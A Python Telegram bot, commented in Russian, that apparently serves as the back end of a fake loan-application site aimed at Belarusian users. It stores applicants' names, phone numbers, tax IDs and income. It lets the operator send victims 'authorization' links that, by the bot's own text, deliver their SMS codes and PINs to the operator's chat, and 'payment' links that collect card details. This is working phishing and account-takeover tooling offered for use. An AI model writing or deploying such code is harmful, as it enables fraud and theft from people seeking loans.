import asyncio
import logging
import sqlite3
import secrets
from datetime import datetime
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command

# ========== КОНФИГУРАЦИЯ ==========
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"  # Замени на свой токен от @BotFather
ADMIN_CHAT_ID = 123456789  # Замени на свой Telegram ID (узнать через @userinfobot)

# Базовый URL твоего сайта (куда будет вести ссылка)
SITE_URL = "https://yourdomain.com"  # Замени на свой домен

# ========== НАСТРОЙКА ==========
logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# ========== БАЗА ДАННЫХ ==========
def init_db():
    conn = sqlite3.connect('applications.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS applications (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            fullname TEXT,
            phone TEXT,
            inn TEXT,
            income REAL,
            term INTEGER,
            amount REAL,
            payment REAL,
            session_id TEXT UNIQUE,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    conn.close()

init_db()

def save_application(data):
    conn = sqlite3.connect('applications.db')
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO applications (fullname, phone, inn, income, term, amount, payment, session_id)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ''', (data['fullname'], data['phone'], data['inn'], data['income'], 
          data['term'], data['amount'], data['payment'], data['session_id']))
    conn.commit()
    conn.close()

def get_application(session_id):
    conn = sqlite3.connect('applications.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM applications WHERE session_id = ?', (session_id,))
    row = cursor.fetchone()
    conn.close()
    return row

def generate_session_id():
    return secrets.token_hex(8)

# ========== КЛАВИАТУРЫ ДЛЯ АДМИНА ==========
def get_admin_keyboard(session_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔐 Ссылка на авторизацию", callback_data=f"gen_auth:{session_id}")],
        [InlineKeyboardButton(text="💳 Ссылка на оплату", callback_data=f"gen_payment:{session_id}")],
        [InlineKeyboardButton(text="❌ Отклонить заявку", callback_data=f"reject:{session_id}")]
    ])

# ========== ФУНКЦИЯ ДЛЯ ВЕБХУКА (вызывается с сайта) ==========
async def send_application_to_admin(data: dict):
    """Отправляет уведомление админу о новой заявке"""
    session_id = data['session_id']
    
    message = (
        f"🆕 <b>НОВАЯ ЗАЯВКА НА КРЕДИТ</b>\n\n"
        f"👤 ФИО: {data['fullname']}\n"
        f"📱 Телефон: {data['phone']}\n"
        f"🆔 ИНН: {data['inn'] or '—'}\n"
        f"💰 Доход: {data['income']} BYN\n"
        f"📅 Срок: {data['term']} мес\n"
        f"💵 Сумма: {data['amount']} BYN\n"
        f"📊 Платёж: ~{data['payment']} руб\n"
        f"🆔 Сессия: <code>{session_id}</code>"
    )
    
    await bot.send_message(ADMIN_CHAT_ID, message, parse_mode="HTML", reply_markup=get_admin_keyboard(session_id))

# ========== ОБРАБОТЧИКИ КНОПОК (ТОЛЬКО ДЛЯ ТЕБЯ) ==========
@dp.callback_query(F.data.startswith("gen_auth:"))
async def generate_auth_link(callback: types.CallbackQuery):
    session_id = callback.data.split(":")[1]
    auth_link = f"{SITE_URL}/auth?session={session_id}"
    
    # Получаем данные заявки для красивого сообщения
    app = get_application(session_id)
    if app:
        fullname = app[1]
        phone = app[2]
        amount = app[6]
    else:
        fullname = "—"
        phone = "—"
        amount = "—"
    
    await callback.message.answer(
        f"🔐 <b>ССЫЛКА ДЛЯ КЛИЕНТА</b>\n\n"
        f"👤 Клиент: {fullname}\n"
        f"📞 Телефон: {phone}\n"
        f"💰 Сумма кредита: {amount} BYN\n\n"
        f"🔗 <b>Ссылка на авторизацию:</b>\n"
        f"<code>{auth_link}</code>\n\n"
        f"📋 Отправьте эту ссылку клиенту.\n"
        f"После перехода клиент введёт номер телефона,\n"
        f"а вы получите SMS-код и PIN в этом чате.",
        parse_mode="HTML"
    )
    await callback.answer()

@dp.callback_query(F.data.startswith("gen_payment:"))
async def generate_payment_link(callback: types.CallbackQuery):
    session_id = callback.data.split(":")[1]
    payment_link = f"{SITE_URL}/payment?session={session_id}"
    
    app = get_application(session_id)
    if app:
        fullname = app[1]
        amount = app[6]
    else:
        fullname = "—"
        amount = "—"
    
    await callback.message.answer(
        f"💳 <b>ССЫЛКА ДЛЯ КЛИЕНТА</b>\n\n"
        f"👤 Клиент: {fullname}\n"
        f"💰 Сумма кредита: {amount} BYN\n\n"
        f"🔗 <b>Ссылка на оплату:</b>\n"
        f"<code>{payment_link}</code>\n\n"
        f"📋 Отправьте эту ссылку клиенту.\n"
        f"Клиент введёт данные карты для получения средств.",
        parse_mode="HTML"
    )
    await callback.answer()

@dp.callback_query(F.data.startswith("reject:"))
async def reject_application(callback: types.CallbackQuery):
    session_id = callback.data.split(":")[1]
    
    # Обновляем статус в базе (опционально)
    conn = sqlite3.connect('applications.db')
    cursor = conn.cursor()
    cursor.execute('UPDATE applications SET status = "rejected" WHERE session_id = ?', (session_id,))
    conn.commit()
    conn.close()
    
    await callback.message.edit_reply_markup(reply_markup=None)
    await callback.message.answer(f"❌ Заявка <code>{session_id}</code> отклонена.", parse_mode="HTML")
    await callback.answer()

# ========== КОМАНДЫ ==========
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    # Проверяем, что это админ
    if message.chat.id != ADMIN_CHAT_ID:
        await message.answer("Этот бот только для администратора.")
        return
    
    await message.answer(
        "🤖 <b>Бот для управления кредитными заявками</b>\n\n"
        "✅ Новые заявки с сайта будут приходить сюда\n"
        "✅ Нажмите кнопку «Ссылка на авторизацию» или «Ссылка на оплату»\n"
        "✅ Бот сгенерирует ссылку — отправьте её клиенту\n\n"
        "🔐 <b>Как работает авторизация:</b>\n"
        "1. Вы отправляете клиенту ссылку на авторизацию\n"
        "2. Клиент вводит номер телефона\n"
        "3. Вы получите SMS-код и PIN в этом чате\n"
        "4. Клиент вводит код → получает доступ к оплате\n\n"
        "💳 <b>Как работает оплата:</b>\n"
        "1. Вы отправляете клиенту ссылку на оплату\n"
        "2. Клиент вводит данные карты\n"
        "3. Средства зачисляются на карту клиента\n\n"
        "📋 <b>Статус заявок:</b> все заявки хранятся в базе данных.",
        parse_mode="HTML"
    )

@dp.message(Command("stats"))
async def cmd_stats(message: types.Message):
    if message.chat.id != ADMIN_CHAT_ID:
        return
    
    conn = sqlite3.connect('applications.db')
    cursor = conn.cursor()
    cursor.execute('SELECT COUNT(*) FROM applications')
    total = cursor.fetchone()[0]
    cursor.execute('SELECT COUNT(*) FROM applications WHERE status = "rejected"')
    rejected = cursor.fetchone()[0]
    conn.close()
    
    await message.answer(
        f"📊 <b>Статистика</b>\n\n"
        f"📝 Всего заявок: {total}\n"
        f"❌ Отклонено: {rejected}\n"
        f"✅ В работе: {total - rejected}",
        parse_mode="HTML"
    )

# ========== ЗАПУСК БОТА ==========
async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
